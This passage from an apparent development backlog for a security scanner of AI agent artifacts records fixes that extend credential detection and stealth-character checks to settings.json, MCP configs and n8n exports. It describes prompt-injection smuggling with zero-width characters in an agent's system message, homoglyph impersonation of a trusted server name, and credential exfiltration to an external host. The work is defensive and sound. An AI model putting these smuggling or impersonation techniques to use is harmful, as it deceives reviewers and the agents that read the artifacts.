  pattern* across two auto-exec sites and C14 the *sink host list* across three rules;
  this applies the identical lesson to the **credential** dataset, which had not drifted
  between copies so much as failed to reach two of the six artifact classes at all. A real
  credential can be pasted into ANY artifact an agent loads, so a measured **9-shape ×
  6-site matrix** (AWS/GitHub/Slack/OpenAI/Google · Stripe/Telegram/Discord · Supabase
  service_role JWT × skill/instructions/command/mcp-config/n8n/settings) was **blind in 10
  of 54 cells against the committed HEAD**. **`.claude/settings.json` was a whole-class
  hole (9/9 shapes ZERO)** — and the worst possible one, since its documented `env` block
  is precisely where Claude Code is *told* to put API keys and the file is routinely
  committed to a repo: the identical three credentials scored **3× HIGH in a `SKILL.md`
  and ZERO in a `settings.json` beside it** (verified live; the file *was* scanned —
  `claude_settings_scanned: 1` — so it was a rule-**reach** gap, not a discovery gap).
  Cause: `_scan_settings` deliberately excludes the broad natural-language rules (a config
  file is not model-facing prose) and the credential rules had been swept out with them.
  Separately the **service_role JWT decode never ran on n8n exports**, so the
  RLS-bypassing server secret was invisible there, and `AGENT-N8N-002`'s direct-embed
  pairing kept a **private `SECRET_RULE.pattern` copy** knowing only SECRET-001's shapes —
  a node shipping a hardcoded Stripe live key to an external host was not recognised as
  reading a credential at all. Fix mirrors C12–C14: one canonical `CREDENTIAL_RULES` that
  `GENERIC_TEXT_RULES` derives from by **identity** (a test asserts the shared object, so
  a copy can't drift), paired with the decode by `_check_credentials`, and the n8n
  structural site consuming the same dataset via `_credential_match`. Matrix **10/54 →
  0/54**. Widening settings is safe *because* these rules are signature matches on
  distinctive key prefixes rather than NL heuristics — a `${VAR}` interpolation, an
  `apiKeyHelper` that shells out, and a secret-manager reference carry no literal — and
  that property is now enforced (a medium/low-confidence rule joining `CREDENTIAL_RULES`
  fails the suite); the anon-key anti-FP (shape-identical to the service_role secret, safe
  to ship) holds at the new site, and the **NL-rule exclusion from settings is locked in
  both directions** as policy rather than accident. Strict superset: the pre-existing
  settings rules still fire and now coexist with credential findings. **Zero-FP verified
  NON-VACUOUSLY on real content:** **5,284 real agent artifacts** (the machine's `~/.claude`
  tree + `G:/skills`) produce a finding set **byte-identical before and after** (283
  findings), and the family *does* fire on that corpus (31 pre-existing SECRET-001 true
  positives) so the zero is real; sharper still for the new site, all **18** real
  `settings.json` files on the machine are clean while those **same 18 files each with ONE
  planted credential are caught 18/18** — the sweep is live on real settings content, not
  just fixtures. Redaction re-asserted at both newly-reached sites (no finding re-emits a
  live secret). No rule added (count stays 42); RULES.md + THREAT_MODEL.md drift `--check`
  green. 114 new tests (`tests/test_credential_reach_parity.py`: the 54-cell reach property
  asserted directly + a scanned-non-vacuity guard, the measured regressions, shared-dataset
  identity, signature-only invariant, 8 benign settings baselines incl. anon-JWT and
  `${VAR}`, the NL-exclusion policy, strict-superset guards, and redaction across both
  sites) — **mutation-verified**: removing the settings sweep, the n8n decode, or reverting
  condition B to its private copy each fails the suite. Full suite **1684 green** (was
  1571); ruff + strict-mypy clean; self-scan gate still 0 HIGH+ (48 items). _(commit 2368c9f)_
- C16. [x] **The stealth-character suite now reaches every artifact class — closing an
  n8n blind spot and a homoglyph hole at the exact site the rule advertises** — C12/C13
  shared the *payload pattern* across two auto-exec sites, C14 the *sink host list*
  across three rules, C15 the *credential family* across every artifact class; this
  applies the identical lesson to the **stealth-character** suite, which **four** sites
  hand-listed independently and which had drifted apart. A smuggled code point is
  invisible in ANY artifact an agent loads, so a measured **4-check × 7-site matrix**
  (invisible `PI-005` / Unicode-Tags `PI-007` / bidi `PI-010` / confusable `PI-011` ×
  skill/instructions/command/subagent/mcp-config/n8n/settings) was **blind in 4 of 28
  cells against the committed HEAD**. Two independent drifts, one cause: **(A)**
  `_scan_n8n` ran tags + bidi but **never the invisible-character check**, so a
  zero-width-smuggled instruction in an n8n AI-agent node's `systemMessage` scored
  **ZERO** while the identical payload in a `settings.json` beside it scored MEDIUM —
  three separate docstrings call these "the universal stealth-character checks" and name
  them as a trio, yet n8n only ever ran two thirds of it. **(B)** the homoglyph check
  **reached prose only** — even though `CONFUSABLE_RULE`'s own description says it
  catches an attacker who "impersonate[s] a trusted tool/skill name past a filter",
  which is *precisely* the mcp.json case: a server named `gіthub` (Cyrillic і) reads as
  the real GitHub server to a human reviewing the config and to the model, but is a
  different string an allowlist never matches. **The one artifact class where the rule's
  own stated attack lives was the class it never ran on.** Fix mirrors C12–C15: one
  canonical `_check_stealth_channels` that all seven classes route through (a spy test
  asserts every class calls it, so no class can hand-list the checks again). Matrix
  **4/28 → 0/28**. Widening to the config classes is safe for the same reason C15's
  credential sweep was — each check is a **signature match on distinctive non-ASCII code
  points**, not an NL heuristic, so a JSON config has no legitimate reason to carry one;
  that property is now enforced (a medium/low-confidence rule joining the suite fails
  the suite), the mixed-script invariant (genuine foreign text is never flagged — only
  Latin-plus-confusable *mixing* within one word) is asserted at every newly-reached
  site, and the NL-rule exclusion from config classes stays policy. Strict superset: the
  pre-existing settings-hook and MCP raw-URL detections still fire and now coexist with
  stealth findings. **Zero-FP verified NON-VACUOUSLY on real content:** **5,284 real
  agent artifacts** (the machine's `~/.claude` tree + `G:/skills` — 2,766 skills, 1,278
  subagents, 1,121 commands, 64 instruction files, 38 mcp configs, 17 settings.json)
  produce a finding set **byte-identical before and after** (297 findings), and the
  stealth family *does* fire on that corpus (3 pre-existing true positives: 1× PI-005,
  2× PI-011) so the zero is real rather than a suite that never runs; sharper still for
  the newly-reached sites, all **37** real `mcp.json` and all **17** real
  `settings.json` on the machine are clean while those **same 54 files each with ONE
  planted confusable are caught 54/54** — the sweep is live on real config content, not
  just fixtures. **Honest limitation:** no real n8n corpus exists on this machine (a
  full `G:` sweep found zero workflow exports), so the n8n cells are **fixture-verified
  only** — the mixed-script invariant is content-independent, but that cell has not been
  measured against real-world exports. **Found en route (deliberately NOT fixed here —
  scope is reach, not the map's contents):** the curated `CONFUSABLES` map has **no `u`
  look-alike at all** and lacks Greek upsilon (U+03C5), so a literal `githυb` is not
  caught by any site; that is a rule-coverage follow-up (F1 below), and the flagship
  impersonation test uses a mapped confusable rather than papering over it. No rule
  added (count stays 42); RULES.md + THREAT_MODEL.md drift `--check` green. 73 new tests
  (`tests/test_stealth_reach_parity.py`: the 28-cell reach property asserted directly +
  a per-site scanned-non-vacuity guard, the 4 measured regressions incl. the
  trusted-server impersonation, canonical-suite membership + the per-class routing spy,
  the signature-only invariant, 21 benign baselines across all 7 sites — ASCII, benign
  non-ASCII (emoji/curly quotes/em dash), and genuine foreign text — and the two
  strict-superset guards) — **mutation-verified**: dropping a check from the suite fails
  13 tests, and reverting the n8n / mcp / settings site to its hand-listed copy fails
  5 / 4 / 5. Full suite **1757 green** (was 1684); ruff + strict-mypy clean; self-scan
  gate still 0 HIGH+ (48 items). _(commit 3cfb976)_

---

## Open follow-ups (surfaced by a run, not yet worked)

- F1. [x] **`CONFUSABLES` map has no `u` look-alike** — surfaced by C16. The curated
  homoglyph map covered Cyrillic/Greek look-alikes for most Latin letters but had **no
  entry mapping to `u`**, so `githυb` (Greek small upsilon U+03C5) — a natural homoglyph
  spoof of one of the most-impersonated names in the ecosystem — was caught at **no**
  site. Fix adds the single entry `"υ": "u"` (U+03C5): it is the *only* `u` look-alike
  within the Cyrillic/Greek scripts the rule's word regex already covers (U+0370–03FF), so
  it needs no widening of `_CONFUSABLE_WORD`, and the capital `Υ`→`Y` mapping is untouched
  (capital upsilon reads as Latin Y, not U). Because the map is a signature (not an NL
  heuristic) and the check fires only on a word that **mixes** ASCII Latin with a
  confusable, the addition changes behaviour for exactly one thing: an ASCII-plus-upsilon
  token. **Zero-FP verified NON-VACUOUSLY on real content:** a targeted sweep of the whole
  real corpus (`~/.claude` + `G:/skills`, **12,723 scanned files**) found **8** files that
  contain U+03C5 at all but **0** tokens that mix ASCII Latin with it — i.e. every real
  upsilon is genuine single-script Greek that the mixed-script gate already excludes — so
  the widening yields **0 new findings** on the benign corpus by construction. Armenian
  `ս`/other look-alikes were deliberately NOT added: they fall outside the rule's
  Cyrillic/Greek word range, so a map entry alone would be inert (word-boundary split) and
  reaching them means broadening the regex — a separate, larger-scope change. 4 new tests
  (`tests/test_agent_supply_chain.py`: the map-contains-a-`u`-homoglyph value guard so the
  coverage can't silently regress, positive `githυb` detection through the live scanner
  with the de-confused `github` + `U+03C5` surfaced in the finding, and a genuine all-Greek
  `υπολογιστής` benign baseline that must not fire). Live CLI end-to-end confirmed
  (`scan -s agent` flags the upsilon skill AGENT-PI-011); full suite **1760 passed / 1
  skipped** (+4 new tests); ruff + strict-mypy clean; self-scan gate still 0 HIGH+ (48
  items). _(commit fe6b173)_

---

Completed prior to this backlog (context): AGENT-PI-001…010, MCP structured scan,
webhook/paste exfil, server-authoritative licensing, CLI menu/README agent-scan surfacing.
